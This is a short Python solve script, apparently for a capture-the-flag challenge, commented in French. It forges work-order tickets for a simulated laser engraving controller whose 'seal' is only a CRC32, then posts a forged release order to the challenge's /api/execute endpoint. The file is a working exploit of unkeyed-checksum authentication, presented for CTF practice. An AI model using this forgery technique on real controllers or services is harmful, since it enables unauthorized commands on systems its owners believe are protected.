#!/usr/bin/env python3
"""Le sceau du graveur (HacKagou 2026) — libération de l'ordre VARN-041.

Le contrôleur G-06 n'authentifie pas les bons de travail : son « SCEAU32 » est
un simple CRC32 du payload (vérifié : crc32(ticket décodé) == suffixe). On forge
donc un bon action=release pour VARN-041 et on recalcule le CRC32. /api/execute
l'accepte et libère l'ordre, dont le QR s'affiche alors.

Le QR encode un ordre CHIFFRÉ (OPENNC-LASER:1:...). La clé est au poste de
surface : le flag final est GRAVÉ SUR BOIS par le laser physique. Non récupérable
à distance — la partie à distance se limite à débloquer la gravure.

Usage : python3 solve.py http://challs.hackagou.nc:<port>
"""
import base64, json, sys, urllib.request, zlib

def forge(payload: bytes) -> str:
    b64 = base64.urlsafe_b64encode(payload).rstrip(b"=").decode()
    return f"{b64}.{zlib.crc32(payload) & 0xffffffff:08x}"

def post(url: str, obj: dict) -> tuple[int, str]:
    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        return 200, urllib.request.urlopen(req, timeout=20).read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def main() -> int:
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://challs.hackagou.nc:47493"
    # Le profil d'origine (brass-v1) est requis : le contrôleur refuse sinon.
    payload = b"station=G06&job=VARN-041&action=release&profile=brass-v1"
    ticket = forge(payload)
    code, body = post(base + "/api/execute", {"ticket": ticket})
    print(f"[execute] HTTP {code} · {body}")
    if code == 200:
        print(f"[+] Ordre libéré. QR chiffré : {base}/qr.png")
        print("[i] Flag gravé sur bois au laser (Atelier de Surface) — présence requise.")
    return 0 if code == 200 else 1

if __name__ == "__main__":
    sys.exit(main())
